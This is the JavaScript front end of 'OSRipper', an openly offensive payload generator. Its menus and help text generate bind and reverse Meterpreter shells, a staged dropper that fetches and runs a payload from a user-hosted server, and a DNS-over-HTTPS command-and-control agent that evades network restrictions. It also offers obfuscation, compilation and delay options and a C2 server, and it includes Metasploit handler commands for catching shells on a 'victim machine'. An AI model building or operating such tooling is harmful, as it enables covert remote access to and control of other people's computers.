/* OSRipper GUI — app.js */
"use strict";

// ── Command metadata ───────────────────────────────────────────────────────────
const CMD_META = {
  bind: {
    desc:        "Opens a port on the victim machine and waits for an incoming connection.",
    label:       "Generate Bind Shell",
    showOptions: true,
    params() {
      return `
        <div class="mb-3">
          <label class="form-label">Bind Port <span class="text-danger">*</span></label>
          <input type="number" class="form-control" id="p_port"
                 placeholder="4444" min="1024" max="65535" value="4444">
          <div class="form-text">Port the victim machine will open and listen on (1024–65535)</div>
        </div>
        <div class="p-2 rounded" style="background:#0d1117;border:1px solid #30363d;font-size:.78rem;color:#8b949e;">
          <i class="bi bi-info-circle me-1"></i>
          Connect with Metasploit: <code>use python/meterpreter/bind_tcp; set RHOST &lt;victim&gt;; set RPORT 4444; exploit</code>
        </div>`;
    },
  },

  reverse: {
    desc:        "Creates an encrypted reverse TCP Meterpreter that calls back to your machine.",
    label:       "Generate Reverse Shell",
    showOptions: true,
    params() {
      return `
        <div class="mb-3">
          <label class="form-label">Your IP (LHOST) <span class="text-danger">*</span></label>
          <input type="text" class="form-control" id="p_host" placeholder="192.168.1.100">
          <div class="form-text">The IP address the payload connects back to</div>
        </div>
        <div class="mb-3">
          <label class="form-label">Callback Port (LPORT) <span class="text-danger">*</span></label>
          <input type="number" class="form-control" id="p_port"
                 placeholder="4444" min="1024" max="65535" value="4444">
        </div>
        <div class="p-2 rounded" style="background:#0d1117;border:1px solid #30363d;font-size:.78rem;color:#8b949e;">
          <i class="bi bi-info-circle me-1"></i>
          Catch with: <code>use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST &lt;ip&gt;; set LPORT 4444; exploit</code>
        </div>`;
    },
  },

  staged: {
    desc:        "Small dropper that downloads and runs the real payload from a web server you host.",
    label:       "Generate Staged Payload",
    showOptions: true,
    params() {
      return `
        <div class="mb-3">
          <label class="form-label">Your IP <span class="text-danger">*</span></label>
          <input type="text" class="form-control" id="p_host" placeholder="192.168.1.100">
        </div>
        <div class="mb-3">
          <label class="form-label">Callback Port <span class="text-danger">*</span></label>
          <input type="number" class="form-control" id="p_port"
                 placeholder="8080" min="1024" max="65535" value="8080">
        </div>
        <div class="p-2 rounded" style="background:#0d1117;border:1px solid #30363d;font-size:.78rem;color:#8b949e;">
          <i class="bi bi-info-circle me-1"></i>
          Generates <code>results/dropper.py</code> and starts an HTTP server on port 8000 to serve the payload.
        </div>`;
    },
  },

  doh: {
    desc:        "DNS-over-HTTPS C2 agent — stealthy communication that bypasses many network restrictions.",
    label:       "Generate DoH C2 Agent",
    showOptions: true,
    params() {
      return `
        <div class="mb-3">
          <label class="form-label">C2 Domain <span class="text-danger">*</span></label>
          <input type="text" class="form-control" id="p_domain" placeholder="c2.example.com">
          <div class="form-text">Domain the agent uses for C2 communication. Run the C2 Server with the same domain.</div>
        </div>
        <div class="p-2 rounded" style="background:#0d1117;border:1px solid #30363d;font-size:.78rem;color:#8b949e;">
          <i class="bi bi-info-circle me-1"></i>
          After generating the agent, switch to the <strong>C2 Server</strong> tab and start the server with the same domain.
        </div>`;
    },
  },

  custom: {
    desc:        "Upload any Python script and encrypt / obfuscate it using OSRipper's multi-layer engine.",
    label:       "Encrypt Custom Script",
    showOptions: true,
    params() {
      return `
        <div class="mb-3">
          <label class="form-label">Python Script (.py) <span class="text-danger">*</span></label>
          <input type="file" class="form-control" id="p_script" accept=".py">
          <div class="form-text">Upload the <code>.py</code> file you want to encrypt / obfuscate</div>
        </div>`;
    },
  },

  server: {
    desc:        "Start the OSRipper C2 web server. Access the dashboard in your browser at the URL shown in the output.",
    label:       "Start C2 Server",
    showOptions: false,
    params() {
      return `
        <div class="mb-3">
          <label class="form-label">C2 Domain <span class="text-danger">*</span></label>
          <input type="text" class="form-control" id="p_domain" placeholder="c2.example.com">
        </div>
        <div class="row g-3 mb-3">
          <div class="col-6">
            <label class="form-label">Port</label>
            <input type="number" class="form-control" id="p_server_port"
                   placeholder="5000" value="5000" min="1024" max="65535">
          </div>
          <div class="col-6 d-flex align-items-end">
            <div class="form-check form-switch mb-2">
              <input class="form-check-input" type="checkbox" id="p_https">
              <label class="form-check-label" for="p_https" style="font-size:.85rem">
                <i class="bi bi-lock me-1"></i>HTTPS
              </label>
            </div>
          </div>
        </div>
        <div class="form-check form-switch mb-0">
          <input class="form-check-input" type="checkbox" id="p_debug">
          <label class="form-check-label" for="p_debug" style="font-size:.85rem">
            <i class="bi bi-bug me-1"></i>Flask debug mode
          </label>
        </div>
        <div class="mt-2 p-2 rounded" style="background:#0d1117;border:1px solid #30363d;font-size:.78rem;color:#8b949e;">
          <i class="bi bi-info-circle me-1"></i>
          The server runs until you press <strong>Stop</strong>. Web UI will be at
          <code>http://&lt;host&gt;:5000</code> once started.
        </div>`;
    },
  },
};

// ── State ─────────────────────────────────────────────────────────────────────
let activeCmd     = "bind";
let activeJobId   = null;
let activeEvtSrc  = null;

// ── Init ──────────────────────────────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
  // Command buttons
  document.querySelectorAll("[data-cmd]").forEach(btn => {
    btn.addEventListener("click", () => selectCommand(btn.dataset.cmd));
  });

  // Option boxes
  document.querySelectorAll(".opt-box").forEach(box => {
    const cb = box.querySelector("input[type=checkbox]");
    box.addEventListener("click", () => {
      cb.checked = !cb.checked;
      syncOptBoxes();
    });
  });

  // Generate button
  document.getElementById("generateBtn").addEventListener("click", onGenerate);

  // Stop button
  document.getElementById("stopBtn").addEventListener("click", onStop);

  // Setup button
  document.getElementById("setupBtn").addEventListener("click", onSetup);

  // Clear / copy
  document.getElementById("clearBtn").addEventListener("click", clearTerminal);
  document.getElementById("copyBtn").addEventListener("click", copyTerminal);

  // Refresh files
  document.getElementById("refreshBtn").addEventListener("click", loadFiles);

  // Auto-select obfuscate when enhanced is toggled on
  document.getElementById("optEnhanced").addEventListener("change", function () {
    if (this.checked) {
      document.getElementById("optObfuscate").checked = true;
      syncOptBoxes();
    }
  });

  selectCommand("bind");
  loadFiles();
  syncOptBoxes();
});

// ── Command selection ──────────────────────────────────────────────────────────
function selectCommand(cmd) {
  activeCmd = cmd;
  const meta = CMD_META[cmd];

  // Update buttons
  document.querySelectorAll("[data-cmd]").forEach(b => {
    b.classList.toggle("active", b.dataset.cmd === cmd);
  });

  // Update description
  document.getElementById("cmdDesc").textContent = meta.desc;

  // Populate params
  document.getElementById("paramsPanel").innerHTML = meta.params();

  // Show/hide options panel
  document.getElementById("optCard").style.display = meta.showOptions ? "" : "none";

  // Update generate button label
  document.getElementById("generateLabel").textContent = meta.label;
}

// ── Option box sync ────────────────────────────────────────────────────────────
function syncOptBoxes() {
  document.querySelectorAll(".opt-box").forEach(box => {
    const cb = box.querySelector("input[type=checkbox]");
    box.classList.toggle("selected", cb.checked);
  });
}

// ── Generate ──────────────────────────────────────────────────────────────────
async function onGenerate() {
  const fd = buildFormData();
  if (!fd) return;

  setStatus("running", "Running…");
  setButtons(true);
  appendLine("$ " + buildPreview(), "t-cmd");

  try {
    const resp = await fetch("/api/generate", { method: "POST", body: fd });
    const data = await resp.json();

    if (!resp.ok) {
      appendLine("[!] " + (data.error || "Unknown error"), "t-err");
      setStatus("error", "Error"); setButtons(false); return;
    }

    appendLine(`[i] Job ${data.job_id.slice(0, 8)} started`, "t-info");
    activeJobId = data.job_id;
    startStream(data.job_id);

  } catch (err) {
    appendLine("[!] Cannot reach GUI server: " + err, "t-err");
    setStatus("error", "Error"); setButtons(false);
  }
}

// ── Stop ──────────────────────────────────────────────────────────────────────
async function onStop() {
  if (!activeJobId) return;
  try {
    const resp = await fetch(`/api/kill/${activeJobId}`, { method: "POST" });
    const data = await resp.json();
    appendLine(data.ok ? "[*] Kill signal sent." : "[!] " + data.error, data.ok ? "t-info" : "t-err");
  } catch (e) {
    appendLine("[!] Failed to stop: " + e, "t-err");
  }
}

// ── Setup ─────────────────────────────────────────────────────────────────────
async function onSetup() {
  const fd = new FormData();
  fd.append("command", "setup");
  if (document.getElementById("setupSystem").checked) fd.append("system", "true");

  setStatus("running", "Setup…");
  setButtons(true);
  appendLine("$ osripper-cli setup" + (document.getElementById("setupSystem").checked ? " --system" : ""), "t-cmd");

  try {
    const resp = await fetch("/api/generate", { method: "POST", body: fd });
    const data = await resp.json();
    if (!resp.ok) { appendLine("[!] " + (data.error || "Error"), "t-err"); setStatus("error", "Error"); setButtons(false); return; }
    activeJobId = data.job_id;
    startStream(data.job_id);
  } catch (e) {
    appendLine("[!] " + e, "t-err"); setStatus("error", "Error"); setButtons(false);
  }
}

// ── Form data builder ──────────────────────────────────────────────────────────
function buildFormData() {
  const fd  = new FormData();
  const get = id => document.getElementById(id);

  fd.append("command", activeCmd);

  if (activeCmd === "bind") {
    const port = get("p_port")?.value;
    if (!port) { alert("Port is required."); return null; }
    fd.append("port", port);
  }
  else if (activeCmd === "reverse" || activeCmd === "staged") {
    const host = get("p_host")?.value?.trim();
    const port = get("p_port")?.value;
    if (!host) { alert("Host (IP) is required."); return null; }
    if (!port) { alert("Port is required."); return null; }
    fd.append("host", host); fd.append("port", port);
  }
  else if (activeCmd === "doh") {
    const domain = get("p_domain")?.value?.trim();
    if (!domain) { alert("Domain is required."); return null; }
    fd.append("domain", domain);
  }
  else if (activeCmd === "custom") {
    const fi = get("p_script");
    if (!fi?.files?.length) { alert("Please select a .py file."); return null; }
    fd.append("script", fi.files[0]);
  }
  else if (activeCmd === "server") {
    const domain = get("p_domain")?.value?.trim();
    if (!domain) { alert("Domain is required."); return null; }
    fd.append("domain", domain);
    fd.append("port",   get("p_server_port")?.value || "5000");
    if (get("p_https")?.checked) fd.append("https", "true");
    if (get("p_debug")?.checked) fd.append("debug", "true");
  }

  // Common options
  if (CMD_META[activeCmd].showOptions) {
    fd.append("output", get("optOutput")?.value?.trim() || "payload");
    if (get("optObfuscate")?.checked)   fd.append("obfuscate",    "true");
    if (get("optEnhanced")?.checked)    fd.append("enhanced",     "true");
    if (get("optCompile")?.checked)     fd.append("compile",      "true");
    if (get("optDelay")?.checked)       fd.append("delay",        "true");
    if (get("optNoRandomize")?.checked) fd.append("no_randomize", "true");
  }

  return fd;
}

// ── Command preview ────────────────────────────────────────────────────────────
function buildPreview() {
  const get   = id => document.getElementById(id);
  const parts = ["osripper-cli", activeCmd];

  if (activeCmd === "bind") {
    parts.push("-p", get("p_port")?.value || "?");
  } else if (activeCmd === "reverse" || activeCmd === "staged") {
    parts.push("-H", get("p_host")?.value || "?", "-p", get("p_port")?.value || "?");
  } else if (activeCmd === "doh") {
    parts.push("-d", get("p_domain")?.value || "?");
  } else if (activeCmd === "custom") {
    parts.push("--script", get("p_script")?.files?.[0]?.name || "?");
  } else if (activeCmd === "server") {
    parts.push(get("p_domain")?.value || "?", "--port", get("p_server_port")?.value || "5000");
    if (get("p_https")?.checked) parts.push("--https");
  }

  if (CMD_META[activeCmd].showOptions) {
    const out = get("optOutput")?.value?.trim() || "payload";
    parts.push("-o", out);
    if (get("optObfuscate")?.checked)   parts.push("--obfuscate");
    if (get("optEnhanced")?.checked)    parts.push("--enhanced");
    if (get("optCompile")?.checked)     parts.push("--compile");
    if (get("optDelay")?.checked)       parts.push("--delay");
    if (get("optNoRandomize")?.checked) parts.push("--no-randomize-output");
  }

  return parts.join(" ");
}

// ── SSE stream ─────────────────────────────────────────────────────────────────
function startStream(jobId) {
  if (activeEvtSrc) { activeEvtSrc.close(); activeEvtSrc = null; }

  activeEvtSrc = new EventSource(`/api/stream/${jobId}`);

  activeEvtSrc.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    if (msg.type === "keepalive") return;

    if (msg.type === "exit") {
      activeEvtSrc.close(); activeEvtSrc = null;
      const ok = msg.code === "0";
      appendLine(ok ? "[+] Completed successfully." : `[!] Exited with code ${msg.code}.`,
                 ok ? "t-ok" : "t-err");
      setStatus(ok ? "done" : "error", ok ? "Done" : "Failed");
      setButtons(false);
      if (ok) setTimeout(loadFiles, 900);
      return;
    }

    if (msg.type === "output") {
      const t = msg.text;
      let cls = "";
      if      (/^\[+\]|^✔|^Success/i.test(t)) cls = "t-ok";
      else if (/^\[!\]|^Error|^✖/i.test(t))   cls = "t-err";
      else if (/^\[\*\]|\[i\]|^Warn/i.test(t)) cls = "t-info";
      appendLine(t, cls);
    }
  };

  activeEvtSrc.onerror = () => {
    activeEvtSrc?.close(); activeEvtSrc = null;
    appendLine("[!] Connection to GUI server lost.", "t-err");
    setStatus("error", "Disconnected");
    setButtons(false);
  };
}

// ── UI helpers ─────────────────────────────────────────────────────────────────
function setButtons(running) {
  document.getElementById("generateBtn").disabled = running;
  document.getElementById("stopBtn").classList.toggle("d-none", !running);
}

function setStatus(state, label) {
  ["sdot", "termDot"].forEach(id => {
    const el = document.getElementById(id);
    el.className = `sdot ${state}`;
  });
  document.getElementById("statusLabel").textContent = label;
  document.getElementById("termLabel").textContent   = label === "Idle" ? "Output" : label;
}

function appendLine(text, cls = "") {
  const term = document.getElementById("terminal");
  const span = document.createElement("span");
  if (cls) span.className = cls;
  span.textContent = text;
  term.appendChild(span);
  term.appendChild(document.createTextNode("\n"));
  term.scrollTop = term.scrollHeight;
}

function clearTerminal() {
  document.getElementById("terminal").innerHTML = "$ Ready.\n";
  setStatus("idle", "Idle");
}

function copyTerminal() {
  const text = document.getElementById("terminal").innerText;
  navigator.clipboard?.writeText(text).then(() => {
    const btn = document.getElementById("copyBtn");
    btn.innerHTML = '<i class="bi bi-clipboard-check"></i>';
    setTimeout(() => { btn.innerHTML = '<i class="bi bi-clipboard"></i>'; }, 1500);
  });
}

// ── File list ──────────────────────────────────────────────────────────────────
async function loadFiles() {
  const container = document.getElementById("filesList");
  try {
    const resp = await fetch("/api/files");
    const data = await resp.json();

    if (!data.files?.length) {
      container.innerHTML = `<div class="text-center text-muted py-3" style="font-size:.82rem;">
        <i class="bi bi-inbox me-1"></i>No files yet</div>`;
      return;
    }

    container.innerHTML = data.files.map(f => {
      const icon =
        f.name.endsWith(".py")  ? "bi-filetype-py text-warning" :
        f.name.endsWith(".bin") ? "bi-file-binary text-success" :
        f.name.endsWith(".exe") ? "bi-file-binary text-danger"  :
        f.name.endsWith(".db")  ? "bi-database text-info"       :
        "bi-file-earmark text-secondary";

      return `<div class="file-row">
        <div class="d-flex align-items-center overflow-hidden me-2">
          <i class="bi ${icon} me-2" style="font-size:1rem;flex-shrink:0;"></i>
          <span class="file-name text-truncate">${esc(f.name)}</span>
          <span class="file-size ms-2">${fmtBytes(f.size)}</span>
        </div>
        <a href="/api/download/${encodeURIComponent(f.name)}"
           class="btn btn-sm btn-outline-primary py-0 px-2 flex-shrink-0" download>
          <i class="bi bi-download me-1"></i>Download
        </a>
      </div>`;
    }).join("");

  } catch {
    container.innerHTML = `<div class="text-center text-danger py-2" style="font-size:.82rem;">
      Failed to load file list</div>`;
  }
}

function fmtBytes(b) {
  if (b < 1024)    return b + " B";
  if (b < 1048576) return (b / 1024).toFixed(1) + " KB";
  return (b / 1048576).toFixed(1) + " MB";
}

function esc(s) {
  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}
